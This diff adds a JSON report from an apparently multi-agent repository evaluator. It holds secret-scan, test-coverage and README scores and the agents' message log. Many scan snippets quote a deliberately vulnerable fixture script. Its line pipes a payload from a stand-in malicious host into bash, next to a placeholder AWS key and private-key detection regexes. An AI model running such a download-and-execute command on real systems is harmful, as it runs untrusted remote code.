@@ -1,0 +1,523 @@
+{
+  "generated_at": "2025-10-19T13:47:34.036628+00:00",
+  "repo_root": "C:\\Projects\\Trust_Bench_Clean",
+  "summary": {
+    "overall_score": 35.36,
+    "grade": "needs_attention",
+    "notes": "Composite built from agent contributions."
+  },
+  "agents": {
+    "SecurityAgent": {
+      "score": 0.0,
+      "summary": "Scanned 694 files and detected 38 potential secret hit(s).",
+      "details": {
+        "matches": [
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\mcp_http_server.py",
+            "pattern": "Private RSA Key",
+            "snippet": "t actual keys)\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",  # nosec\\n    \"Private EC Key\": r\"----"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\MCP_SERVER_RESOLUTION.md",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\n   - Has injection patterns\\n   - Used "
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_server.py",
+            "pattern": "Private RSA Key",
+            "snippet": "9A-Za-z]{36}\",\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",\\n    \"Private EC Key\": r\"-----BEGIN EC"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\datasets\\golden\\fixtures\\repos\\vuln-mini-1\\bad_script.sh",
+            "pattern": "AWS Access Key",
+            "snippet": "cious.example/payload.sh | bash\\nAPI_KEY=AKIAEXAMPLE123456789\\npython -c \"import os; eval('print(2+2)'"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\multi_agent_system\\tools.py",
+            "pattern": "Private RSA Key",
+            "snippet": "a-z-]{10,60}\",\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",\\n}\\n\\n\\nEXCLUDED_DIRS = {\\n    \".git\",\\n   "
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\output\\report.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\n   - Has injection patterns\\\\n   - U"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\cache_index.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n          },\\n          {\\n            "
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0042d1d184474dcabfaca323c162d730\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\007ebeadb83f40a9baba6bce9dd48e75\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\096b687043a54a23b0f479e7e269e21c\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0b62f7a70a7e44daa97902e540701d35\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0dfef823ff4b46a4b04e2255573bb78f\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0dfef823ff4b46a4b04e2255573bb78f\\workspace\\Trust_Bench-main\\mcp_http_server.py",
+            "pattern": "Private RSA Key",
+            "snippet": "t actual keys)\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",  # nosec\\n    \"Private EC Key\": r\"----"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0dfef823ff4b46a4b04e2255573bb78f\\workspace\\Trust_Bench-main\\MCP_SERVER_RESOLUTION.md",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\n   - Has injection patterns\\n   - Used "
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0dfef823ff4b46a4b04e2255573bb78f\\workspace\\Trust_Bench-main\\trust_bench_server.py",
+            "pattern": "Private RSA Key",
+            "snippet": "9A-Za-z]{36}\",\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",\\n    \"Private EC Key\": r\"-----BEGIN EC"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0dfef823ff4b46a4b04e2255573bb78f\\workspace\\Trust_Bench-main\\datasets\\golden\\fixtures\\repos\\vuln-mini-1\\bad_script.sh",
+            "pattern": "AWS Access Key",
+            "snippet": "cious.example/payload.sh | bash\\nAPI_KEY=AKIAEXAMPLE123456789\\npython -c \"import os; eval('print(2+2)'"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\108a45d85c044519bd489dd194c51a2b\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\213fbe2a2ebe4777a38fb51ab167e8e9\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\32ee973460634bebb9dac615c3772b30\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\3a01a4013c604d2fa9dc93e37dfe5568\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\3dff0932f0164788b468026a1fa47a64\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\4af9de514c9642a3a5ff3db962314c45\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\4c4de317843b496289d3384f36f8a7e6\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\4ef43f49653a48c68113fa818f289f31\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\54f27ace11f84eda8d53bca93c7ff4a5\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\5f3a7bab9f344735838ee9aa7d51abea\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\667569d85a5b4c70b972780156cbb280\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\6d8b80eb429e48e4b42cecc99cbab665\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\7a3e040cba2e403aa60d2503b70ddeed\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\7a9aeb7acab541ea98852c4b5da8c597\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\a027c22e594d4b6abc977726eb91fc89\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\d5c3239d3b1a48ad81b0f1c04237f3e3\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\db2b9225bcf24160a36143a13beb6cd8\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\e2686b8681c6446783c90b90c745d9cd\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\e81e1b813f474e1e9061ba78e8d2060d\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\f0aab97d2cfe466dab9cada230fce05e\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\f4a8d686a3be48ffa4c00e9a901f1773\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          },
+          {
+            "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\f83605eea9b14ba493e98ae876231de0\\status.json",
+            "pattern": "AWS Access Key",
+            "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+          }
+        ],
+        "scanned": 694
+      }
+    },
+    "QualityAgent": {
+      "score": 40.57,
+      "summary": "Indexed 700 files across 6 language group(s); 50 appear to be tests.",
+      "details": {
+        "language_histogram": {
+          "other": 139,
+          "yaml": 22,
+          "markdown": 131,
+          "python": 279,
+          "json": 88,
+          "typescript": 41
+        },
+        "total_files": 700,
+        "test_files": 50,
+        "test_ratio": 0.071
+      }
+    },
+    "DocumentationAgent": {
+      "score": 65.51,
+      "summary": "Found 1 README file(s) with roughly 43 words and 0 section heading(s).",
+      "details": {
+        "readme_paths": [
+          "C:\\Projects\\Trust_Bench_Clean\\README.md"
+        ],
+        "total_words": 43,
+        "sections": 0,
+        "has_quickstart": false,
+        "has_architecture": false
+      }
+    }
+  },
+  "conversation": [
+    {
+      "sender": "Manager",
+      "recipient": "SecurityAgent",
+      "content": "Task assigned: Scan the repository for high-signal secrets or credentials.",
+      "data": {
+        "tool": "secret_scan"
+      }
+    },
+    {
+      "sender": "Manager",
+      "recipient": "QualityAgent",
+      "content": "Task assigned: Summarize repository structure and gauge test coverage.",
+      "data": {
+        "tool": "repository_structure"
+      }
+    },
+    {
+      "sender": "Manager",
+      "recipient": "DocumentationAgent",
+      "content": "Task assigned: Review README files and verify documentation depth.",
+      "data": {
+        "tool": "documentation_review"
+      }
+    },
+    {
+      "sender": "SecurityAgent",
+      "recipient": "Manager",
+      "content": "Secret scan completed.",
+      "data": {
+        "name": "secret_scan",
+        "score": 0.0,
+        "summary": "Scanned 694 files and detected 38 potential secret hit(s).",
+        "details": {
+          "matches": [
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\mcp_http_server.py",
+              "pattern": "Private RSA Key",
+              "snippet": "t actual keys)\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",  # nosec\\n    \"Private EC Key\": r\"----"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\MCP_SERVER_RESOLUTION.md",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\n   - Has injection patterns\\n   - Used "
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_server.py",
+              "pattern": "Private RSA Key",
+              "snippet": "9A-Za-z]{36}\",\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",\\n    \"Private EC Key\": r\"-----BEGIN EC"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\datasets\\golden\\fixtures\\repos\\vuln-mini-1\\bad_script.sh",
+              "pattern": "AWS Access Key",
+              "snippet": "cious.example/payload.sh | bash\\nAPI_KEY=AKIAEXAMPLE123456789\\npython -c \"import os; eval('print(2+2)'"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\multi_agent_system\\tools.py",
+              "pattern": "Private RSA Key",
+              "snippet": "a-z-]{10,60}\",\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",\\n}\\n\\n\\nEXCLUDED_DIRS = {\\n    \".git\",\\n   "
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\Project2v2\\output\\report.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\\\n   - Has injection patterns\\\\n   - U"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\cache_index.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n          },\\n          {\\n            "
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0042d1d184474dcabfaca323c162d730\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\007ebeadb83f40a9baba6bce9dd48e75\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\096b687043a54a23b0f479e7e269e21c\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0b62f7a70a7e44daa97902e540701d35\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0dfef823ff4b46a4b04e2255573bb78f\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0dfef823ff4b46a4b04e2255573bb78f\\workspace\\Trust_Bench-main\\mcp_http_server.py",
+              "pattern": "Private RSA Key",
+              "snippet": "t actual keys)\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",  # nosec\\n    \"Private EC Key\": r\"----"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0dfef823ff4b46a4b04e2255573bb78f\\workspace\\Trust_Bench-main\\MCP_SERVER_RESOLUTION.md",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\\n   - Has injection patterns\\n   - Used "
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0dfef823ff4b46a4b04e2255573bb78f\\workspace\\Trust_Bench-main\\trust_bench_server.py",
+              "pattern": "Private RSA Key",
+              "snippet": "9A-Za-z]{36}\",\\n    \"Private RSA Key\": r\"-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----\",\\n    \"Private EC Key\": r\"-----BEGIN EC"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\0dfef823ff4b46a4b04e2255573bb78f\\workspace\\Trust_Bench-main\\datasets\\golden\\fixtures\\repos\\vuln-mini-1\\bad_script.sh",
+              "pattern": "AWS Access Key",
+              "snippet": "cious.example/payload.sh | bash\\nAPI_KEY=AKIAEXAMPLE123456789\\npython -c \"import os; eval('print(2+2)'"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\108a45d85c044519bd489dd194c51a2b\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\213fbe2a2ebe4777a38fb51ab167e8e9\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\32ee973460634bebb9dac615c3772b30\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\3a01a4013c604d2fa9dc93e37dfe5568\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\3dff0932f0164788b468026a1fa47a64\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\4af9de514c9642a3a5ff3db962314c45\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\4c4de317843b496289d3384f36f8a7e6\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\4ef43f49653a48c68113fa818f289f31\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\54f27ace11f84eda8d53bca93c7ff4a5\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\5f3a7bab9f344735838ee9aa7d51abea\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\667569d85a5b4c70b972780156cbb280\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\6d8b80eb429e48e4b42cecc99cbab665\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\7a3e040cba2e403aa60d2503b70ddeed\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\7a9aeb7acab541ea98852c4b5da8c597\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\a027c22e594d4b6abc977726eb91fc89\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\d5c3239d3b1a48ad81b0f1c04237f3e3\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\db2b9225bcf24160a36143a13beb6cd8\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\e2686b8681c6446783c90b90c745d9cd\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\e81e1b813f474e1e9061ba78e8d2060d\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\f0aab97d2cfe466dab9cada230fce05e\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\f4a8d686a3be48ffa4c00e9a901f1773\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            },
+            {
+              "file": "C:\\Projects\\Trust_Bench_Clean\\trust_bench_studio\\data\\repositories\\f83605eea9b14ba493e98ae876231de0\\status.json",
+              "pattern": "AWS Access Key",
+              "snippet": "ins `bad_script.sh` with FAKE AWS key: `AKIAEXAMPLE123456789`\"\\n        },\\n        {\\n          \"patte"
+            }
+          ],
+          "scanned": 694
+        }
+      }
+    },
+    {
+      "sender": "QualityAgent",
+      "recipient": "Manager",
+      "content": "Repository structure summarized.",
+      "data": {
+        "name": "repository_structure",
+        "score": 40.57,
+        "summary": "Indexed 700 files across 6 language group(s); 50 appear to be tests.",
+        "details": {
+          "language_histogram": {
+            "other": 139,
+            "yaml": 22,
+            "markdown": 131,
+            "python": 279,
+            "json": 88,
+            "typescript": 41
+          },
+          "total_files": 700,
+          "test_files": 50,
+          "test_ratio": 0.071
+        }
+      }
+    },
+    {
+      "sender": "DocumentationAgent",
+      "recipient": "Manager",
+      "content": "Documentation review finished.",
+      "data": {
+        "name": "documentation_review",
+        "score": 65.51,
+        "summary": "Found 1 README file(s) with roughly 43 words and 0 section heading(s).",
+        "details": {
+          "readme_paths": [
+            "C:\\Projects\\Trust_Bench_Clean\\README.md"
+          ],
+          "total_words": 43,
+          "sections": 0,
+          "has_quickstart": false,
+          "has_architecture": false
+        }
+      }
+    },
+    {
+      "sender": "Manager",
+      "recipient": "All Agents",
+      "content": "Evaluation complete. Grade: NEEDS_ATTENTION (35.36 pts).",
+      "data": {
+        "overall_score": 35.36,
+        "grade": "needs_attention",
+        "notes": "Composite built from agent contributions."
+      }
+    }
+  ]
+}
